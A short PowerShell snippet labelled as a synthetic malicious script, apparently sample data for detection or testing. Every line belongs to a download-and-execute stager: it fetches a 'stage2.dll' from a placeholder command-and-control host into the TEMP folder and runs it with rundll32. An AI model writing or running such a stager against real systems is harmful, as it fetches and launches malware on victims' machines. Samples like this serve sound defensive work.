# Synthetic malicious PowerShell script
$url = "http://malicious.example.com/c2"
$out = "$env:TEMP\stage2.dll"
Invoke-WebRequest -Uri $url -OutFile $out
rundll32.exe $out,Start
